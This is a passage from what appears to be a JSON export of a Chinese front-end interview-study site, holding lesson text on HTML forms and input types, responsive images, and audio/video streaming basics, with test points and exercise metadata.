可以被浏览器缓存，效率（速度）更高 | 不可缓存 |\n| **数据类型/长度** | 只允许 ASCII 字符，URL长度有限制（2048），不同浏览器不同。 | 类型没有限制，支持二进制数据。长度（几乎）无限制 |\n| **安全性** | 安全性更低，数据在URL中容易暴露 | 安全性稍高，不过传输过程也是明文的，不会在浏览记录、日志中存储 |\n| **回退/刷新？** | 无副作用（幂等），可重复访问 | 有副作用，数据会被重新提交（不幂等），浏览器一般会提示用户数据会被重新提交 |\n| **使用场景** | 获取数据 | 提交数据：添加、修改、删除 |\n\n> **📢因此**：\n> \n> -   数据有安全性要求的时候，建议用POST并且加密（HTTPS）。\n> -   **获取数据**（如查询）的的时候，一般用GET；**提交数据**（添加、修改、删除）时一般用POST。\n\n* * *\n\n## 02、`<input>`表单元素\n\n表单元素 `<input>` 单标签、行内元素，主要用于输入各种类型数据。包含多个表单类型`type`：文本框、复选框、单选框、按钮等。\n\n## input.type\n\n| **input.type/** 属性 | **描述** | **备注** |\n| --- | --- | --- |\n| text | **文本输入框**（默认），单行文本，不支持换行 | `<input type=\"text\">` |\n| password| **密码输入框** |  |\n| radio | **单选框**，相同name为一组互斥 | 记得赋值value |\n| checkbox | **多选框**，相同name为一组。如选中多个值会提交多个key-value | 记得赋值value |\n| number| 数字输入，`step`设置步长 |   |\n| hidden| **隐藏框/域**，页面不可见，用于一些逻辑处理 |  |\n| button | **普通按钮**，按钮显示`value`值，结合JavaScript事件使用 `<input type=\"button\" value=\"提交\" onclick=\"\">` | 建议用`<button>`元素代替 |\n| submit| **表单提交按钮**，在form中有效，直接提交表单数据 | 同`<button>`元素的`submit`模式 |\n| reset | **表单重置按钮**，重置表单的数据，form中有效。 |  |\n| image | **图片提交按钮**，同submit，**`src`** 设置图片，无图则显示`alt` | height、width设置图片大小 |\n| file| **文件选择框**，如多值则value为第一个值，js获取files取多个值 | capture媒体拍摄方式-移动端 |\n| accept | 可接受文件类型，多个逗号隔开，`image/png, video/*` | `.jpg,.png,.doc` |\n| email | **电子邮箱**，支持邮箱格式验证 | 验证邮箱格式 |\n| range | **滑块数字**，用 min 和 max 来设置值的范围，step设置步长 | `list`可设置刻度 |\n| search | **搜索框**，和`text`差不多 |   |\n| tel| **电话号码**，和`text`差不多，有些终端支持虚拟键盘 | 不验证（不同地区格式不同） |\n| url | **URL地址**，和`text`差不多 | 验证url格式 |\n| color | **颜色输入控件**|    |\n| date| **日期输入**，年月日 |    |\n| datetime-local | **日期时间输入**，年月日、时分秒，Chrome/Opera /Edge支持 | yyyy-MM-ddThh:mm |\n| month | **年月输入**，输入年份或月份 | `value=\"2018-05\"` |\n| time | 时间控件，小时、分 |    |\n| week | **年和周数**，用于输入以年和周数组成的日期，支持的不多 | |\n\n> **📢注意**：\n> \n> -   一般浏览器对不支持的type，都默认降级为**text**。\n> -   **文件选择框**如通过表单提交，表单需设置属性`enctype=\"multipart/form-data\"`设置表单数据编码为多种数据组合，同时设置提交方式为post，才可以上传文件（二进制）。\n\n### `<input>` 的常规属性\n\n| **基础属性** | **描述** | **相关type** | **值/备注** |\n| --- | --- | --- | --- |\n| **name** | **控件名称**（通用属性），表单中须赋值，会作为参数名 |  |  |\n| **type** | **表单控件类型** |   \n | 详见上表 |\n| **value** | `<input>`的值，可设置默认值。 |  |  |\n| tabindex | 当前文档的 Tab 导航顺序中的位置 |  |  |\n| size | **宽度**，文本框可显示的**字符**宽度，类似css的width |  | 字符数量 |\n| min/maxlength | **可输入字符数量**，文本框可输入最少/大字符数量 | 文本输入类 |  |\n| readonly | **只读**，不可编辑，IE有光标显示 |  | `true`值可省略 |\n| disabled | **不可用**，无光标 |  | 值可省略 |\n| **placeholder** | **占位符**/水印，用于输入提示，比较常用 | 文本输入类 |   |\n| **checked** | **选中状态** | 单选、多选 | 值可省略 |\n| min/max | **最大/小值**，数字、日期值的边界 | 数字、日期 | 大小边界验证 |\n| pattern，IE10 | **模式**（正则表达式），用于值的合法性检测 | 文本输入类 | 正则验证 |\n| required | **必填**，hidden、image 或者按钮类型无效 |  | 值可省略，必填验证 |\n| multiple | 是否**允许多个值**，逗号隔开 | email、file | 布尔值，值可省略 |\n| step | **步长**，数字、日期 | 数字、日期 |   |\n| list | **候选值**：输入框的候选值列表，`<datalist>`值，显示value | 大多数 |  |\n| autocomplete | **自动填充**，设置浏览器的自动填充模式 | 大多数 |  |\n| autofocus | 页面加载时**自动聚焦** |  | 布尔值，值可省略 |\n| inputmode | **值输入模式**，虚拟键盘，text, tel, url, email, numeric | 文本输入类 |   |\n| form | 所属form，值为其id |  |  |\n| formaction | 表单提交属性，还有formenctype、formmethod、formnovalidate、formtarget | image、submit |   |\n\n### `<datalist>`数据集合\n\n`<datalist>` 数据集合元素，包含了一组`<option>`元素，提供给文本类`<input>`（`list`属性）使用，作为可选值的数据集。\n\n-   文本、数字输入的候选值，包括text、number、email、url、tel、search等。\n-   `range`的刻度。\n\n## 03、`<textarea>`多行文本\n\n`<textarea>` 可以输入多行文本，支持换行、空格，行内元素。\n\n| **属性** | **描述** | **值** |\n| --- | --- | --- |\n| name | 表单提交数据的key |  |\n| rows | 文本行数，同css样式的高度 | 整数 |\n| cols | 文本列数，同css样式的宽度 | 整数 |\n\n> **`<textarea>`** 还可以使用 `<input>` 中的一些常见属性，如autocomplete、autofocus、disabled、placeholder、readonly，和 required、maxlength等。可使用css样式属性`resize`设置输入框的大小调整方式。\n\n## 04、`<label>` 辅助表单聚焦\n\n`<label>` 是一个文本标签，最主要的使命是辅助表单元素聚焦，点击<label>会让其`for`关联的元素得到焦点，`for`属性值所指的元素`id`就是她的服务客户。因此<label>是表单控件的最佳搭档，点击`label`\\=等于点击对应元素。<label>是一个双标签，里可以嵌套其他行内元素，如文字、图片、表单元素。\n\n| **属性** | **描述** |\n| --- | --- |\n| for | 关联的元素id |\n| form | `<form>`的id，可以将`<label>`放到form外面了，这就很自由了！ |\n\n```html\n<p>\n    <label for=\"uname\">\n        <span>Name:</span>\n        <input id=\"uname\" type=\"text\" name=\"uname\">\n        <span title=\"required\">*</span>\n    </label>\n</p>\n<div>\n    <label for=\"username\">Name: <span title=\"required\">*</span></label>\n    <input id=\"username\" type=\"text\" name=\"username\">\n</div>\n<label>\n    <input type=\"checkbox\" />阅读并同意条款<img src=\"../res/head-48.gif\" width=\"24px\">\n</label>\n```\n\n> **⭐还有一种简写的方式**：用 label 元素把 input 元素包裹起来，以减少for- id 的使用。\n\n* * *\n\n## 05、`<button>`按钮\n\n`<button>` 是HTML5的新元素，行内元素，作用和`input-button`的功能基本相同。不同的是他是`双标签`，内部可以自由定义内容，也可以使用伪元素，实现更丰富的按钮效果，所以按钮用他就对了。\n\n| **属性** | **描述** | **值** |\n| --- | --- | --- |\n| **type** | 按钮的类型 | **button**：普通按钮；**submit**：表单提交按钮；**reset**：表单重置按钮； |\n| value | button 的初始值，参数的形式随表单提交 |  |\n\n```html\n<button type=\"button\">普通按钮</button>\n<button type=\"submit\">提交submit</button>\n<button type=\"reset\" style=\"width:80px;\"><img src=\"../res/sk (13).png\"><br/>重置</button>\n```\n\n### `<button>`**和**`<input button>`**的区别？**\n\n-   `<input>`是单标签，无关闭标签。\n-   `<button>`的显示内容在标签之间，应用场景更丰富；`<input>`的显示内容在`value`属性上，只支持纯文本。\n-   `<button>`的鼠标事件里可以直接写代码。\n\n## 06、 `<select/option>`选项\n\n`<select>`选择列表元素，行内元素，有弹出下拉框、选项列表两种模式，`<option>`是他的选项子元素。启用`multiple`或`size>1`时，显示为列表，否则显示为下拉框模式。\n\n| **元素/属性** | **描述** | **值/备注** |\n| --- | --- | --- |\n| **`<select>`**| 选项控件 |  |\n|  required | 必填，表单的通用属性，还有disabled、autofocus、form等 |  |\n|  multiple | 多选，显示为列表，不设置该属性则弹出下拉框。 | 值也是multiple，值可省略 |\n|  size | 控件显示的选项行数，配合multiple使用 | 整数，默认1 |\n|  value/selectedIndex | 选中的值/索引 |  |\n| `<option>` | `<select>`的选项子元素 |   |\n|  selected | 设置选中 | 值可省略 |\n|  value | 选项的值 | 如果没有value，则取标签内容 |\n|  disabled | 不可用 |  |\n| `<optgroup>` | 选项分组，给`<option>`分组 |  |\n|  label | 显示的文本 |  |\n|  disabled | 分组都禁用 |  |\n\n```html\n<form action=\"\">\n    多选multiple：\n    <select id=\"selfruit\" name=\"selfruit\" multiple size=\"4\" list=\"optfruit\">\n        <optgroup label=\"热带水果\">\n            <option value=\"1\">香蕉</option>\n            <option value=\"2\">火龙果</option>\n        </optgroup>\n        <optgroup label=\"蔬菜\">\n            <option value=\"3\">绿色蔬菜</option>\n            <option value=\"4\">冬瓜</option>\n            <option value=\"4\" disabled>男瓜</option>\n        </optgroup>\n        <option value=\"5\">其他</option>\n    </select>\n    单选：\n    <select name=\"selsex\" size=\"0\" required>\n        <option value=\"\" selected>选择性别</option>\n        <option value=\"1\">男</option>\n        <option value=\"2\">女</option>\n        <option value=\"5\">其他</option>\n    </select>\n    <input type=\"submit\">\n</form>\n```\n\n## 07、`<progress><meter>`进度计量\n\n两者都可以实现进度的效果，`<progress>`为进度条元素。`<meter>`更为丰富，表示某种计量，适用于温度、重量、金额等量化的可视化展示。\n\n| **属性** | **描述** |\n| --- | --- |\n|`<progress>` | **进度条** |\n|  max | **最大值**，默认为1 |\n|  value | **进度值**，不设置则为\"不确定\"状态，显示为加载中的效果（不同浏览器表现不同） |\n| `<meter>` | **进度计量**，显示已知范围的标量值或者分数值。（/ˈmiːtər/ 计量） |\n|  value | 值 |\n|  min/max | 最小值（默认0），最大值（默认1） |\n|  low/high | 低值、高值，用于设置“正常值”的边界区域，以显示不同效果 |\n|  optimum | 最优值（ /ˈɑːptɪməm/ ），配合low/high使用，判断当前值是否最优 |\n|  form | 关联form表单的id |\n\n```html\n<fieldset style=\"display:inline-block;\">\n    <legend>Progress</legend>\n    progress：<progress value=\"0.3\"></progress><br>\n    progress(无value)： <progress></progress><br>\n    value溢出： <progress max=\"100\" value=\"120\"></progress>\n</fieldset>\n<fieldset style=\"display:inline-block;\">\n    <legend>Meter</legend>\n    普通进度：<meter value=\"0.2\"></meter><br>\n    value小于low：<meter value=\"10\" max=\"60\" min=\"0\" optimum=\"26\" low=\"20\" high=\"30\"></meter><br>\n    value大于high：<meter value=\"55\" max=\"60\" min=\"0\" optimum=\"15\" low=\"20\" high=\"30\"></meter><br>\n    value居中<meter value=\"25\" max=\"60\" min=\"0\" optimum=\"26\" low=\"20\" high=\"30\"></meter>\n</fieldset>\n```\n\n## 08、表单布局\n\n表单是前端常用的组件，布局必不可少，一个美观、简介的布局尤为重要。一个最小单位的表单输入部件，除了表单元素，还必须考虑标题、错误提示等。对于整个表单还要考虑多个表单输入项的行列排列、对齐。\n\n最基本的HTML表单布局思路：\n\n-   **小部件**：用`<div>`或`<p>`包装一个最小的部件，里面包含`<label>`表单项标题、`<input>`、`<span>`提示信息。\n\n```html\n<div>\n  <label for=\"uname\">姓名：</label>\t\t<!-- 标签 -->\n  <input type=\"text\" name=\"uname\" required maxlength=\"20\">\t<!-- 表单元素 -->\n  <span title=\"必填\">*</span>\t\t\t\t\t <!-- 作为额外提示，包括输入验证错误的提示信息 -->\n</div>\n```\n\n-   **表单分区**，对于复杂的表单，用`<fieldset>`、标题`<h*>`、分段`<section>`等来分区组织不同类型的内容。\n-   **表单布局**：借助CSS表格布局、Grid、Flex等工具进行布局。\n-   **第三方表单组件**：实际项目中都会引入第三方UI组件库，组件库里都会提供更丰富的布局支持。",
    "testPoint": "1. **新表单元素**：\n   - 了解 HTML5 新增的表单控件类型，如 `date`、`email`、`url`、`tel`、`range`、`color` 等。\n\n2. **属性与验证**：\n   - 讨论表单元素的新属性，例如 `placeholder`、`required`、`pattern`、`min`、`max` 等及其作用。\n\n3. **自定义验证**：\n   - 理解如何使用 JavaScript 自定义表单验证，并处理验证错误。\n\n4. **表单提交与处理**：\n   - 讨论表单的提交方式（GET vs POST），以及如何通过 AJAX 处理表单数据。\n\n5. **可访问性**：\n   - 了解如何提高表单的可访问性，例如使用标签和 ARIA 属性。\n\n6. **跨浏览器兼容性**：\n   - 讨论不同浏览器对新表单控件的支持情况及可能的兼容性问题。",
    "exerciseKeyList": "[\"a7e1aeb6-aaf9-43fe-92ac-fd574fb60a96\",\"9d0e350c-5b48-4122-b54c-dc55552ccc05\",\"1934d168-5248-425b-9648-2c14f2b4f570\",\"9464fd89-1578-4f3b-a103-840b73b1987e\",\"706d3e5d-a02b-4925-84e2-3e2c81c7ef1b\",\"2efd0e6a-c70c-4df5-965d-4e13b48fbd21\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 5,
    "createAt": "2024-09-25T01:51:10.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1934d168-5248-425b-9648-2c14f2b4f570",
        "title": "input上传文件可以同时选择多张吗？怎么设置？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:37:03.000Z",
        "updateAt": "2021-12-26T16:05:35.000Z"
      },
      {
        "exerciseKey": "2efd0e6a-c70c-4df5-965d-4e13b48fbd21",
        "title": "HTTP 中如何处理表单数据的提交？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-06T13:24:47.000Z",
        "updateAt": "2024-08-10T17:06:08.000Z"
      },
      {
        "exerciseKey": "706d3e5d-a02b-4925-84e2-3e2c81c7ef1b",
        "title": "GET和POST的请求的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:49:57.000Z",
        "updateAt": "2024-07-19T18:13:40.000Z"
      },
      {
        "exerciseKey": "9464fd89-1578-4f3b-a103-840b73b1987e",
        "title": "如何控制 input 输入框的输入字数？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:43:05.000Z",
        "updateAt": "2022-10-11T09:22:06.000Z"
      },
      {
        "exerciseKey": "9d0e350c-5b48-4122-b54c-dc55552ccc05",
        "title": "如何禁止input展示输入的历史记录？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:28:38.000Z",
        "updateAt": "2021-12-26T16:05:18.000Z"
      },
      {
        "exerciseKey": "a7e1aeb6-aaf9-43fe-92ac-fd574fb60a96",
        "title": "使用input标签上传图片时，怎样触发默认拍照功能？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:55:50.000Z",
        "updateAt": "2021-12-26T16:05:59.000Z"
      }
    ]
  },
  "10": {
    "id": 10,
    "tagId": 12,
    "title": "响应式图片",
    "explanation": "响应式是指实现不同屏幕分辨率的终端上浏览网页的不同展示方式。\n\n本知识点的主要内容有：\n\n-   为什么要使用响应式图片\n-   怎么实现响应式图片\n\n## 1、为什么要使用响应式图片\n假如有一张图片的显示宽度为200px，那么，它在 `1x`（即设备像素比为 1 的显示器） 的显示器上，是占了 200 个物理像素（即实际所占的像素）；它在 `2x` 的显示器上，实际上是占了 400 个物理像素；在 `3x` 的显示器上，实际上是占了 600 个物理像素；在 `4x` 的显示器上就是占了 800 个物理像素。\n\n如果这个图片只提供 200 像素的尺寸，那么在 `2x~4x` 的显示器上看起来就很模糊。如果只提供 800 像素的版本，那么在 `1x~3x` 的设备上会显得多余，因为加载时间会相较长，所以我们要使用响应式图片。\n\n再比如一个场景，相同的banner，在电脑上需要使用大图，但是手机上面使用小图，不然会造成手机上加载慢浪费流量等问题，这也可以使用响应式图片来解决。\n\n## 2、实现方法\n\n### css3 media query\n\n一个办法是使用`backgound-image`结合媒体查询，如下所示：\n\n```bash\n.banner{\n  background-image: url(/static/large.jpg);\n}\n\n@media screen and (max-width: 767px){\n  background-image: url(/static/small.jpg);\n}\n```\n\n这种方法的缺点是对SEO不太友好，因为如果使用img标签还可以写个alt属性。\n\n### picture标签\n\n```html\n<picture>\n    <source srcset=\"banner_w1000.jpg\" media=\"(min-width: 801px)\">\n    <source srcset=\"banner_w800.jpg\" media=\"(max-width: 800px)\">\n    <img src=\"banner_w800.jpg\" alt=\"\">\n</picture>\n```\n\n如上，如果页面宽度大于800px（PC），则加载大图，而在手机上加载小图。这样写浏览器就只会加载source里面的一张图片。但是如果是用js动态插进去的，它还是会去加载两张，只有写在html里面加载初始化页面的时候才只加载一张。\n\npicture必须要写img标签，否则无法显示，对picture的操作最后都是在img上面，例如onload事件是在img标签触发的，picture和source是不会进行layout的，它们的宽和高都是0。\n\n另外使用source，还可以对图片格式做一些兼容处理：\n\n```bash\n<picture>\n    <source type=\"image/webp\" srcset=\"banner.webp\">\n    <img src=\"banner.jpg\" alt=\"\">\n</picture>\n```\n\nwebp在保持同等清晰度的情况下，体积可以减少一半，但是目前只有Chrome支持，Safari和firefox一直处于实验阶段，所以其它的浏览器如firefox将会加载jpg格式的照片：\n\n### srcset\n\n`srcset`是HTML5中`img`元素的一个属性，用于指定一组备选图像，并告诉浏览器根据设备的特性选择最合适的图像进行显示。\n\n属性格式：图片地址 宽度描述w 像素密度描述x，多个资源之间用逗号分隔。\n\n例如：\n\n```bash\n<img src=\"small.jpg \" srcset=\"big.jpg 1440w, middle.jpg 800w, small.jpg 1x\" />\n```\n\n表示浏览器宽度达到 800px 则加载 middle.jpg ，达到 1400px 则加载 big.jpg。\n\n注意：像素密度描述只对固定宽度图片有效。\n\nimg 元素的 size 属性给浏览器提供一个预估的图片显示宽度。\n\n属性格式：媒体查询 宽度描述（支持px），多条规则用逗号分隔。\n\n```bash\n<img src=\"images/gun.png\"\n         srcset=\"images/bg_star.jpg 1200w, images/share.jpg 800w, images/gun.png 320w\"\n         sizes=\"(max-width: 320px) 300w, 1200w\"/>\n```\n\n上面的例子表示浏览器视口为 320px 时图片宽度为 300px，其他情况为 1200px。\n\n### image-set\n\ncss属性`image-set()`支持根据用户分辨率适配图像。\n\n```bash\nbody {\n    background-image: -webkit-image-set( url(../images/pic-1.jpg) 1x, url(../images/pic-2.jpg) 2x, url(../images/pic-3.jpg) 600dpi);\n    background-image:         image-set( url(../images/pic-1.jpg) 1x, url(../images/pic-2.jpg) 2x, url(../images/pic-3.jpg) 600dpi);\n}\n```\n\n上面代码将会为普通屏幕使用 pic-1.jpg，为高分屏使用 pic-2.jpg，如果更高的分辨率则使用 pic-3.jpg，比如印刷。\n\n不过，`image-set()` 的支持情况不如 `srcset` 和 `<picture>` 元素广泛，在使用时需注意兼容性。",
    "testPoint": "1. **响应式设计的概念**：\n   - 理解什么是响应式设计，为什么在现代网页中重要。\n\n2. **常用的实现方法**：\n   - 讨论不同的实现方式，如使用 CSS（`max-width`）、`<picture>` 元素、`srcset` 和 `image-set()`。\n\n3. **浏览器兼容性**：\n   - 了解不同方法的浏览器支持情况，特别是 `image-set()` 和 `<picture>`。\n\n4. **性能优化**：\n   - 如何选择合适的图片格式和大小以优化加载速度和用户体验。\n\n5. **设备像素比（DPR）**：\n   - 理解设备像素比的概念以及如何利用它来加载适合的图像。\n\n6. **图像懒加载**：\n   - 讨论懒加载技术，如何推迟图像的加载以提高页面性能。\n\n7. **SEO 和可访问性**：\n   - 了解如何为响应式图片提供替代文本和其他 SEO 最佳实践。",
    "exerciseKeyList": "[\"d95319f5-e060-4727-a7a4-d4996c00a6c7\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 7,
    "createAt": "2024-09-27T01:35:38.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "d95319f5-e060-4727-a7a4-d4996c00a6c7",
        "title": "现在要开发一个响应式的网站，怎么实现根据设备的尺寸和分辨率，加载不同尺寸的 banner？要求不使用 JavaScript",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-09-27T01:42:33.000Z",
        "updateAt": "2024-09-27T01:42:39.000Z"
      }
    ]
  },
  "11": {
    "id": 11,
    "tagId": 12,
    "title": "多媒体技术",
    "explanation": "对于大多数前端工程师来说，音视频技术是一个比较少涉足的领域，\n\n本知识点主要介绍流媒体技术中的**文本**、**图形**、**图像**、**音频**和**视频**多种理论知识，涉及到播放器、web媒体技术、主流框架等内容。\n\n### 一、音视频基础\n\n#### 1.1 视频\n\n##### 1.1.1 基础概念\n\n| **码率** | 单位时间内取样率越大，精度就越高，处理出来的文件就越接近原始文件。 |\n| --- | --- |\n| **帧率** | 对视频来说，帧率对应这观看卡顿。帧率越高，流畅度越高，低帧率会造成视觉卡顿。 |\n| **压缩率** | 经过压缩后文件的大小 / 原始文件的大小 \\* 100% = 压缩率。编码压缩越小越好，但压得越小，解压时间 |\n| **分辨率** | 用于度量图像内数据量多少的一个参数，和视频清晰度息息相关。 |\n\n##### 1.1.2 视频容器格式\n\n  \n容器格式相信大家经常见到：  \nMP4、AVI、FLV、TS/M3U8、WebM、OGV、MOV...  \n\n##### 1.1.2 视频编码格式\n\n| **H.264** | 目前最流行的编码格式。 |\n| --- | --- |\n| **H.265** | 新型的编码格式，高效的视频编码。用来以替代H.264/AVC编码标准。 |\n| **VP9** | VP9是WebM Project开发的下一代视频编码格式 。VP9支持从低比特率压缩到高质量超高清的所有Web和移动用例，并额外支持10/12位编码和HDR |\n| **AV1** | AOM（Alliance for Open Media，开放媒体联盟）制定的一个开源、免版权费的视频编码格式。AV1是google制定的VP9标准的继任者，也是H265强有力的竞争者。 |\n\n#### 1.2 音频\n\n##### 1.2.1 基础概念\n\n| **采样率** | 音频采样率是指录音设备在一秒钟内对声音信号的采样次数，采样频率越高声音的还原就越真实越自然。 |\n| --- | --- |\n| **采样大小** | 一秒钟所采的样本数为比特率，每个样本中信息的比特数就是位深，即采样精度，单位为Bit。 |\n| **比特率** | 指每秒传送的比特(bit)数，又称数据信号速率。单位为比特/秒、千比特/秒或兆比特/秒。比特率越高，表示单位时间传送的数据就越多。 |\n| **压缩率** | 原始音频数据与通过PCM等压缩编码技术压缩后的数据大小的比率 |\n\n##### 1.2.2 音频容器格式\n\n  \n音频格式也比较常见：WAV、AIFF、AMR、MP3、Ogg...  \n\n##### 1.2.3 音频编码格式\n\n| **PCM** | 脉冲编码调制(Pulse Code Modulation,PCM)，PCM是数字通信的编码方式之一。 |\n| --- | --- |\n| **AAC-LC(MPEG AAC Low Complexity)** | 低复杂度编码解码器（AAC-LC — 低复杂度高级音频编码）是低比特率、优质音频 的高性能音频编码解码器。 |\n| **AAC-LD** | （又名AAC低延迟或MPEG-4低延迟音频编码器），为电话会议和OTT服务量身打造的低延迟音频编解码器 |\n| **LAC（Free Lossless Audio Codec）** | 免费无损音频编解码器。是一套著名的自由音频压缩编码，其特点是无损压缩。  2012年以来它已被很多软件及硬件音频产品（如CD等）所支持。 |\n\n#### 1.3 常见标签\n\n##### 1.3.1 `<audio>` 元素\n\n###### 1.3.1.1 基本用途\n\n`<audio>` 元素用于在网页中嵌入音频内容。它可以播放音乐、播客、音效等。\n\n###### 1.3.1.2 结构\n```html\n<audio controls>\n    <source src=\"audio-file.mp3\" type=\"audio/mpeg\">\n    <source src=\"audio-file.ogg\" type=\"audio/ogg\">\n    Your browser does not support the audio element.\n</audio>\n```\n\n###### 1.3.1.3 主要属性\n- **controls**：显示音频控制界面（播放、暂停、音量等）。\n- **autoplay**：页面加载时自动播放音频。\n- **loop**：音频播放结束后重新开始。\n- **muted**：默认静音播放。\n- **preload**：设置音频加载的方式（如 `none`、`metadata`、`auto`）。\n\n##### 1.3.2 `<video>` 元素\n\n###### 1.3.2.1  基本用途\n`<video>` 元素用于在网页中嵌入视频内容。它可以播放电影、教程、演示等。\n\n###### 1.3.2.2 结构\n```html\n<video controls width=\"600\">\n    <source src=\"video-file.mp4\" type=\"video/mp4\">\n    <source src=\"video-file.webm\" type=\"video/webm\">\n    Your browser does not support the video element.\n</video>\n```\n\n###### 1.3.2.3 主要属性\n- **controls**：显示视频控制界面（播放、暂停、音量等）。\n- **autoplay**：页面加载时自动播放视频。\n- **loop**：视频播放结束后重新开始。\n- **muted**：默认静音播放。\n- **poster**：在视频加载前显示的占位图片。\n- **preload**：设置视频加载的方式（如 `none`、`metadata`、`auto`）。\n- **width** 和 **height**：设置视频显示的宽度和高度。\n\n\n### 二、直播技术\n\n  \n首先看一张直观的示意图，这是一张从主播推流到用户拉流的直播流程。  \n![](https://static.ecool.fun//article/65386a51-a5f4-4762-ae32-261a6f0cb22f.png)  \n\n#### 流媒体协议\n\n  \n每一个你在网络上观看的视频或音频媒体都是依靠特定的网络协议进行数据传输，基本分布在会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。  \n  \n常用协议：RTMP、RTP/RTCP/RTSP、HTTP-FLV、HLS、DASH。各个协议都有自己优势与劣势。  \n\n#### 推拉流过程\n\n  \n主播在设备上开启直播，采集设备将主播声音及画面采集后通过对应协议推流到「流媒体服务器」上。此时观看端(即拉流端)通过拉流协议即可从「流媒体服务器」上拉取到流数据进行播放。  \n\n### 三、播放器\n\n  \n本节主要讲述播放器相关技术，在本节中会简要讲述播放器在拿到相关流之后如何运作。  \n![](https://static.ecool.fun//article/3b421f74-9b11-4001-b84b-491402469a62.png)  \n\n#### 4.1 拉流\n\n  \n第一步是拉流，在播放之前率先需要拿到视频流才可能执行播放。  \n举个例子，flv格式的视频流数据，我们可以通过浏览器提供的：Fetch API、Stream API 进行拉流。  \n\n#### 4.2 解封装\n\n  \n拿到流数据之后，紧接着需要执行解封装操作。在开始播放的之前，需要把图像、声音、字幕(可能不存在)等从拉取的流数据中分离出来，这个分离的行为和过程就是解封装(demux)。  \n![](https://static.ecool.fun//article/f6f4d1e3-2a1b-4f9b-acf3-82bd046efab6.png)  \n在解封装之后获得图像、声音、字幕等基本流，而后基本流可以通过解码器进行解码。  \n\n#### 4.3 demux(解码)\n\n  \n从上层解封装中，我们了解到，在解封装之后，需要对分离出来的原始码流进行解码，生成音、视频播放器可播放的数据。  \n在解码过程中，我们会得到各式各样的数据，我们挑选几个重要的来讲：  \n\n##### 4.3.1 SPS 和 PPS\n\n  \n这俩哥们儿决定了最大视频分辨率、帧率等以及还有一系列视频播放当中的参数。PPS通常与SPS一起，保存在码流的起始位置。  \n\n-   SPS、PPS中保存了一组编码视频序列的全局参数，如果丢掉，解码过程很可能GG。\n\n##### 4.3.2IBP帧\n\n  \n![](https://static.ecool.fun//article/e23ab044-9aa8-4501-9e87-b80410410326.png)  \n\n-   I帧，关键帧。I帧进行帧内预测，可以单独解码本帧的数据，I帧通常是每个GOP（MPEG所使用的一种视频压缩技术）的第一帧，经过适度地压缩，作为随机访问的参考点可以当成静态图像。\n-   B帧，向前预编码帧。它要使用一个前面的I帧或P帧和一个后面的I帧或P帧进行预测。不仅要取得之前的缓存画面，还要解码之后的画面，通过前后画面的与本帧数据的叠加取得最终的画面。\n-   P帧，前向预测编码在帧(predictive-frame),通过将图像序列中前面已编码帧的时间冗余信息去充分去除压缩传输数据量的编码图像，也成为预测帧。\n\n##### 4.3.3 SEI(补充增强信息)\n\n-   视频编码器在输出视频码流的时候，可以没有SEI。举个简单例子，之前特别火的直播答题，通过SEI传递较多和答题业务相关的信息，并通过SEI承载的信息，优化题目显示和观众音视频观看的同步性。\n\n##### 4.3.4 PTS和DTS\n\n-   DTS（Decoding Time Stamp）：即解码时间戳，这个时间戳的意义在于告诉播放器该在什么时候解码这一帧的数据。\n-   PTS（Presentation Time Stamp）：即显示时间戳，这个时间戳用来告诉播放器该在什么时候显示这一帧的数据。  \n    简而言之，这俩哥们儿很可能直接决定了你音视频播放是不是同步的。\n\n  \n解码还会生成各式各样的产物，这里就不展开介绍了，有兴趣的同学可以在本篇最后查看。  \n\n#### 4.4 remux(复用)\n\n  \n有demux，自然就有remux。把基本的音频ES、视频ES、字幕ES等组合成一个完整的多媒体就是Remux(复用)。  \n对一个视频来说，改变封装格式，改变视频编码，需要remux和demux的配合。这里不展开叙述。  \n\n#### 4.5 渲染\n\n  \n渲染，指的是将解码后的数据，在 pc 硬件上（显示器、扬声器）进行播放。负责渲染的模块我们称之为渲染器(Render)，视频渲染器主流有EVR（Enhanced Video Render）以及 madVR (madshi Video Render)，Web 播放器一般使用 video 标签来嵌入。  \n  \n自定义渲染：以我们的H.265播放器为例，利用浏览器提供的接口来实现一个模拟的 video 标签，通过 canvas 和 audio 来实现渲染。  \n\n### 四、web媒体技术\n\n#### 4.1 webRTC\n\n  \n网页即时通信（英语：Web Real-Time Communication），它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点（Peer-to-Peer）的连接，实现视频流和（或）音频流或者其他任意数据的**快速传输**。  \n  \n组成形式：  \n视频引擎（VideoEngine）、音效引擎（VoiceEngine）、会议管理（Session Management）、iSAC(音效压缩)、VP8（Google自家的WebM项目的视频编解码器）、APIs（Native C++ API, Web API）  \n\n![](https://static.ecool.fun//article/723b3914-e7cf-4ced-863d-2b7b2619e039.png)  \n\n#### 4.2 MSE\n\n  \n用过播放器的同学对于MSE肯定不会陌生。媒体源扩展 API（MSE） 提供了实现无插件且基于 Web 的流媒体的功能。使用 MSE，媒体串流能够通过 JavaScript 创建，并且能通过使用 audio 和 video 元素进行播放。  \nMSE 大大地扩展了浏览器的媒体播放功能，提供允许 JavaScript  生成媒体流。这可以用于自适应流（adaptive streaming）及随时间变化的视频直播流（live streaming）等应用场景。  \n  \n这里不展开叙述MSE的使用，感兴趣的同学可以去搜索一下MSE，相信能帮助到你们。  \n\n#### 4.3 WebXR\n\n  \nXR 是 Extended Reality (扩展现实) 的简写，包括了 VR (虚拟现实)，AR (增强现实)，MR (Mixed reality，混合现实)，WebXR 支持各种 XX 现实的设备。WebXR 允许开发人员创建在所有VR/AR设备都可运行的沉浸式内容，以实现基于 Web 的 VR/AR 体验。  \n\n#### 4.4 WebGL\n\n  \nWebGL（全写 Web Graphics Library）是一种 3D 